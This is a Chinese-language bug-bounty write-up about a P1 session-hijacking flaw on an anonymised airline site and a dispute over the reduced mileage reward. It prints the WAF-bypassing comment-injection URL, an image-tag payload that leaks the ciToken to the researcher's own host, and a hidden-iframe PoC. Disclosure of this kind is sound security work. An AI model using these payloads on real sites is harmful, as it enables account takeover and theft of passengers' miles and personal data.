![](https://image.3001.net/images/20200423/1587621812_5ea12fb4b2eb4.jpg!small)

**在去年12月到今年1月间，我在众测平台上，针对一些奖励里程数的航空公司网站发起了安全测试，由于当时新冠疫情还没发生，所以我就想以挖洞方式获取一些航空里程奖励，好好出去旅游旅游。最终虽然发现了一个P1级的高危漏洞，原本按照航空公司说好的一百万英里航空里程奖励，但却只被奖励了5万英里。**

## 漏洞概况

在测试某家航空公司网站（funnyairline.com）的核心应用过程中，我碰到了一个内置的二级网站，此处暂且把它称为secondary.com，该航空公司网站拥有大量二级域名，登录了航空公司主网站后，如果要登录这些二级域名的对应网站，只需点击主站列出的对应登录按钮即可无需输入密码实现登录。

该目标航空公司网站的这种绑定登录方式以前我也遇过，但每家公司的做法不一且没有标准模式，本质来说这种方式，主站和二级域名网站之间都共享用到了同一个访问令牌TOKEN，该TOKEN令牌被用来在客户端和服务端之间进行身份验证。在该航空公司网站中，该TOKEN是经md5加密且名叫ciToken的字符串值。

当我在做前期探测时，Burp的抓包中出现了一个有意思的请求：

![](https://image.3001.net/images/20200423/1587621220_5ea12d64d5a85.png!small)

从上图中可以看到，我们提到的关键ciToken响应在了注释标签中（Comment
tag）。经过一番测试，我发现目标网站部署有WAF，但我用‘-->’实现了WAF绕过，并用onauxclick事件构造实现了一个XSS漏洞，但经上报后被分类为了“重复报”。但事情远还没结束，为了提高这个问题的危害性，我继续做了一些深入测试。之后发现，在该航空公司主站中存在一个重定向跳转请求：

>
> [https://funnyairline.com/sso?return_to=crew&D=%trash=1](https://funnyairline.com/sso?return_to=crew&D=%trash=1)

上述请求发起后，服务端响应的最终重定向跳转地址为：

> Location: secondary.com/CMSSO.jsp?cid=USERTOKEN&trash=1

## 漏洞利用

仔细观察上述重定向跳转的请求响应后，我想到了构造以下重定向跳转请求：

>
> [https://funnyairline.com/sso?return_to=crew&D=--](https://funnyairline.com/sso?return_to=crew&D=--)><image/src=//ssrftest.com/x/eoh39.gif>

之后，服务端响应回来的最终跳转地址为：

>
> <https://secondary.com/CMSSO.jsp?cid=USERTOKENLEAKED-->><image/src=//ssrftest.com/x/eoh39.gif>

当然，像第一张Burp抓包图一样，我们可以看到ciToken信息同样被显示在了注释标签内容中，大致样式为：

    
    
    <!--    
    ciToken: token --><image/src=//ssrftest.com/x/eoh39.gif>

从中可见，我的设想是通过我控制的ssrftest.com网站构造一张可访问图片，然后以referer头指向，来实现对ciToken信息的窃取。由于目标网站部署了难绕过的Akamai
CDN WAF，比较头大，所以我才采用了onauxclick事件执行交互。

最终，我构造的PoC是如下的一个简单iframe，是的没错，目标网站支持框架响应（Frameable response）：

    
    
    <iframe src=”https://funnyairline.com/sso?return_to=crew&D=sadsad--><image/src=//ssrftest.com/x/eoh39.gif>" width=0 height=0></iframe>

窃取Token后可实现的利用

之后经过继续测试，我总算搞明白了可深入利用之处。在第一张Burp抓包图的响应界面中，我们可以看到“youmusthavecookiesenabled”的字样，另外，在其请求中还可以存在一个名为RT的参数，

每一个执行对二级域名网站的SSO登录，都可以在后面附加一个RT参数，如下：

> <https://secondary.com/CMSSO.jsp?RT=CID%3D2G5Ula479sZpPVFOlvkUGblnJX4oql-> LvVug1MTXtZak2DcXnoyIJdoLSMDclZ3-G8Q7Z8.EpBBHXI8JfnbWU7q.ZR6KReG1UUajNsy3rYI3FamDmka-> xpLWa6oGUloYeGurfRKl39u7zqvTp5n4w1wRYeB.nzEh0IHX3M-SM3gqa9a1Pu6DkJqlstGWltRgN.rWuahyghihyCoHySb8P2hAFbBw1oULP.aZESmn2Ie-K.9mwRqVMBgaPwTR3rxdsxqcdZ6ohbqjSnwpYm-> XiReYr3GS3HU6SM2wJeO80hytj593zBH9PQqIZtU2SsVlgDiobqj0fJ1666j2e7Jz.V4AwviQWbYCRiE8l2X5pFfaUnHNRyIdy2WiCz7iBosmy1AyT9-jbPMOCrRGAW8yAIrbVPIAWeCb9k8-NtS5kzE_>

RT=后面是一串访问网站认证后的加密cookie，所以CMSSO.jsp?cid=重定向跳转时会附加上这个RT参数值，之后，服务端的响应消息大致如下：

> HTTP/1.1 302 Moved Temporarily
>
> Cache-Control: private, no-store
>
> Content-Type: text/html;charset=UTF-8
>
>
> Location:[https://anysecondarydomain.com/Account/SSOLogOn?onlineAuthCode=U2FsdGVkX1-ezqwA-c5zRMSDSM-> UjnvL80xFZDm6PhwU9ZnxB49aMy-> RBji_nLui&offlineAuthCode=U2FsdGVkX1-h0SCWcm1xh1t-uPr0za6cRPxjWTNrADtmx-> Ro56cX](https://anysecondarydomain.com/Account/SSOLogOn?onlineAuthCode=U2FsdGVkX1-ezqwA-c5zRMSDSM-> UjnvL80xFZDm6PhwU9ZnxB49aMy-> RBji_nLui&offlineAuthCode=U2FsdGVkX1-h0SCWcm1xh1t-uPr0za6cRPxjWTNrADtmx-> Ro56cX)**_STOyRUT3O

可以看到，服务端会为此生成一个“onlineAuthCode”，这就是一个有效的验证信息，综合上述提到的PoC利用方式，从ssrftest.com中获得泄露的ciToken，就能形成会话劫持。但有意思的是，ciToken竟然可以复用，完全没有次数和时间限制。

## 漏洞影响

对于该航空公司来说，这种会话劫持类漏洞会对在一些二级域名上绑定多个账户的受害者形成影响，比如攻击者可以把受害者账户的里程加到自己账户上，或者在一些里程换票或优惠券兑换场景中造成危害。该漏洞还可导致一些乘客个人PII信息泄露，最终被定级为了P1的高危级。

## 漏洞奖励

由于该漏洞发现在COVID疫情事件之前，按照该航空公司此前给出的漏洞奖励计划是，其它漏洞威胁暂且不谈，一个P1高危漏洞可以奖励一百万英里的航空里程。但是，最终它们给我的奖励是5万英里的航空里程奖励。理由是“害怕引起老板的注意”：

> It would certainly raise the boss’s eyebrows to increase a payout for XSS to
> our High payout tier. Since this is an in-house bug bounty program we track
> by defect.

相反，针对同类型的漏洞，其它公司却是按照漏洞影响和危害给予奖励的：

> Below is our bounty payout structure, which is based on the severity and
> impact of bugs.

## 总结

对比来看，确实有些搞笑。最后还是建议大家做众测时，要选择那些设置有申诉调解渠道的平台，要不的话遇到问题你会欲哭无泪的。还有最好找那种目标范围大、奖励金额高、打款速度快和沟通协调良好的测试项目。

 ***参考来源：[medium](https://medium.com/@Master_SEC/55-000-facebook-token-leak-vs-funny-airline-token-leak-9d6ea5182fc5)，clouds 编译整理，转载请注明来自 FreeBuf.COM**

